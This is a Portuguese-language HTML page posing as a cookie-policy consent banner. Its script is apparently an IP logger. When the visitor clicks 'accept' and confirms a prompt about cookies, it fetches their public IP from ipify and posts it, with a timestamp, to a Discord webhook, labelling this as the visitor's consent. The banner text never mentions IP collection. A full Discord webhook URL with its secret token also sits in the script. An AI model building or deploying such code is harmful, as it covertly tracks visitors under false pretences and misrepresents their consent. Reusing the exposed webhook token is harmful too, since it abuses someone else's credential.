<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>site</title>
</head>
<body>
  <h1>politica de cookies</h1>

  <p>
    Utilizamos cookies para melhorar sua experiência em nosso site, personalizar conteúdos e analisar o tráfego. Alguns cookies são essenciais para o funcionamento da página, enquanto outros nos ajudam a entender como você utiliza nossos serviços.

Ao clicar em “Aceitar todos os cookies”, você concorda com o uso de cookies conforme nossa Política de Privacidade.

Você pode escolher quais cookies deseja permitir ou recusá-los a qualquer momento nas configurações..
  </p>

  <button id="aceitar">Aceitar e continuar</button>

  <p id="status"></p>

  <script>
    https://discord.com/api/webhooks/1541639010433245225/62DQ5projBfPIrtlfzvB6epZOzK2E2CYRdMgk_w_SeGyB-h16WjrPxvs_0nrDs0TtgBm
    const DISCORD_WEBHOOK_URL = "SUA_URL_WEBHOOK_AQUI";

    document.getElementById("aceitar").onclick = async () => {
      const status = document.getElementById("status");

      if (!confirm(
        "Concorda em aceitar os cookies?"
      )) return;

      status.textContent = "Enviando autorização...";

      try {
        // O navegador consulta um serviço de IP público.
        const consulta = await fetch("https://api.ipify.org?format=json");
        if (!consulta.ok) throw new Error("Falha na consulta de IP");

        const dados = await consulta.json();

        // Envia o IP ao webhook do Discord.
        const envio = await fetch(DISCORD_WEBHOOK_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            embeds: [{
              title: "Teste de IP autorizado",
              color: 3447003,
              fields: [
                { name: "IP público", value: dados.ip },
                { name: "Consentimento", value: "Confirmado pelo visitante" },
                { name: "Horário", value: new Date().toISOString() }
              ]
            }]
          })
        });

        if (!envio.ok) throw new Error("Falha no envio ao Discord");

        status.textContent = "obrigado! agora voce pode acessar o site";
      } catch (erro) {
        status.textContent =
          "Não foi possível concluir. Confira a URL do webhook e tente novamente.";
      }
    };
  </script>
</body>
</html>
